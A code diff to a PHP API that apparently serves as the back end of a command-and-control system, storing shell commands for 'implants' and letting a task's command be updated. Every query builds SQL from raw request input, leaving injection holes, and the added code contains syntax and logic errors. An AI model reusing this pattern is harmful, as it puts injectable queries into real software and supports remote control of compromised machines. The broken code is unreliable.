@@ -13,7 +13,7 @@ if ($parts[1] != "api") {
     die();
 }
 
-function handle_method() {
+function main() {
     global $parts, $pdo;
 
     $method = $_SERVER["REQUEST_METHOD"];
@@ -44,10 +44,9 @@ function handle_method() {
             break;
         case "PUT":
             switch ($parts[2]) {
-            case "new_task":
-                $implant_id = $parts[3] ?? null;
-                if ($implant_id == null) {
-                    // find suitable response code
+            case "update_task":
+                $task_id = $parts[3] ?? null;
+                if ($task_id == null ) {
                     http_response_code(404);
                     die();
                 }
@@ -56,19 +55,26 @@ function handle_method() {
                     die();
                 }
                 $cmd = $_POST['cmd'];
-                $stmt = $pdo->query("UPDATE Tasks SET implant_id = '$implant_id', command = '$cmd'");
-                $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
-                echo json_encode($results);
+                // check if status  = 0
+                $stmt = $pdo->query("SELECT status FROM Tasks WHERE task_id = $task_id");
+                $result = $stmt->fetchALL(PDO : FETCH_ASSOC);
+                $row = $result->fetch_assoc();
+                if ($row[0] != 0) {
+                    $reply->update = false;
+                    echo json_encode($reply);
+                    return;
+                }
+                $stmt = $pdo->query("UPDATE Tasks SET command = '$cmd' WHERE task_id = $task_id");
+                $reply->update = true;
+                echo json_encode($reply);
                 break;
                 default;
                     http_response_code(404);
                     die();
             }
-
             break;
         case "POST":
             switch ($parts[2]) {
-
                 case "new_task":
                     $implant_id = $parts[3] ?? null;
                     if ($implant_id == null) {
@@ -98,6 +104,5 @@ function handle_method() {
     }
 }
 
-handle_method();
-
+main();
 ?>
